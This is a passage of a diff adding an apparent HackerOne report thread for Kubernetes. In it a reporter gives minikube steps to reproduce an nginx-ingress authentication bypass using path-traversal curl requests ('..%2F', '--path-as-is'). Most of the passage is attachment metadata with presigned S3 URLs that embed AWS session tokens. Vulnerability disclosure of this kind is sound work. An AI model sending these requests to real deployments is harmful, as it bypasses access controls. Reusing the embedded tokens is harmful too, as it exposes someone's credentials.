+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14010935,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I understand that running minikube with ingress is not so easy. For me it's really painful, and I need to try several times before it startup. You not necessary need to run it on minikube, you can do it also on some other Kubernetes instance. \n\nIt's almost 4 weeks passed since I have reported this issue and you didn't even reproduce it. Not really mentioning understanding the problem, which is not easy, as it's in the edge between nginx-ingress and nginx itself. \n\nIf you are not able to reproduce it, I will report this problem to kubernetes team directly. \n",
+            "automated_response": false,
+            "created_at": "2021-10-22T12:24:30.621Z",
+            "updated_at": "2021-10-22T12:24:30.621Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14014919,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I have found a way to check this vulnerability on default docker driver for minikube.\nSteps To Reproduce:\n=================\n* install minikube\n* start minikube: `minikube start`\n{F1490462}\n* enable ingress: `minikube addons enable ingress`\n{F1490464}\n* add entry to /etc/hosts file: `127.0.0.1 app.test`\n* check if cluster is fully operational: ` kubectl get pods -A`. You should get list of pods similar to this one:\n{F1490465}\n* build each docker image:\n\n```cd auth-service; docker build -t auth-service:0.0.4 .```\n{F1490467}\n`cd protected-service; docker build -t protected-service:0.0.1 .`\n{F1490468}\n`cd public-service; docker build -t public-service:0.0.1 .`\n{F1490470}\n\n* load images to minikube (it's taking long time)\n\n```\nminikube image load auth-service:0.0.4\nminikube image load protected-service:0.0.1\nminikube image load public-service:0.0.1\n```\n{F1490477}\n* apply kubernetes configuration: `kubectl apply -f app.yaml`\n{F1490478}\n* check if all pods are up and running: `kubectl get pods`\n{F1490480}\n* run minikube tunnel: `minikube tunnel`\n{F1490481}\n* in second terminal run: `curl -v http://app.test/public-service/..%2Fprotected-service/protected`\n{F1490482}\n* check logs from auth-service: \n\n```\nkubectl get pods\nkubectl logs auth-service-6df56d9bbb-ld8zz\n```\n{F1490483}\nHeaders are manipulated and wrong authentication decision is made.\n* try second call: `curl --path-as-is -v http://app.test/public-service/../protected-service/protected`\n{F1490484}\nand logs:\n{F1490485}\nsame effect: headers are manipulated\n\n",
+            "automated_response": false,
+            "created_at": "2021-10-22T19:11:45.139Z",
+            "updated_at": "2021-10-22T19:11:45.139Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1490485,
+                    "filename": "2021-10-22_21_09_10-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t5kf2q06szvvzr1d85m6fcswpkv2?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_21_09_10-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_21_09_10-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070215Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3e2ad8dc6c6ef66614477f017c485fff10dc4feb4b0706c49036d6f6c877ad79"
+                },
+                {
+                    "id": 1490484,
+                    "filename": "2021-10-22_21_08_47-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pz8hxnmdfiwouvllto7j3yy93agd?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_21_08_47-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_21_08_47-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070215Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a52408794bb6b403f266da1a69ed7bab0c48b7f207bcb80c8f1a22638c8d87c9"
+                },
+                {
+                    "id": 1490483,
+                    "filename": "2021-10-22_21_06_23-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xwrbu0pxkro80w2qehbeyy6o2yui?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_21_06_23-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_21_06_23-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070215Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6e9bb753e3db452994aaa7a70db815222410190c7b70a1425cc9c73b06af5170"
+                },
+                {
+                    "id": 1490482,
+                    "filename": "2021-10-22_21_04_51-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9f9i39bv6569xvdhagkfqmm5tuod?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_21_04_51-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_21_04_51-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070215Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=083490598fdc7bf7edd6976b8ddd014acc43267de4283850a5a9f6a92af0249d"
+                },
+                {
+                    "id": 1490481,
+                    "filename": "2021-10-22_21_04_01-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/58obg9msz74pupkalgto6sm37w67?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_21_04_01-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_21_04_01-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070215Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=be2dc260948f8ff70820cb867cb1e0d23bdf9969aec803efb867172ff2b0054d"
+                },
+                {
+                    "id": 1490480,
+                    "filename": "2021-10-22_21_02_57-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wvsjk2xwqc985bedf97w7mzv9el2?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_21_02_57-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_21_02_57-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070215Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=174f7d81721fb8df1b1ef76d0afc9e0571380027579def2a06b864423c4750c4"
+                },
+                {
+                    "id": 1490478,
+                    "filename": "2021-10-22_21_02_09-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vytzlnev7mw164yx4ytpgtd3r280?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_21_02_09-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_21_02_09-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070215Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=742061ae1a710acffcd10a762d46a55b7bda753e49e8db7cdce8f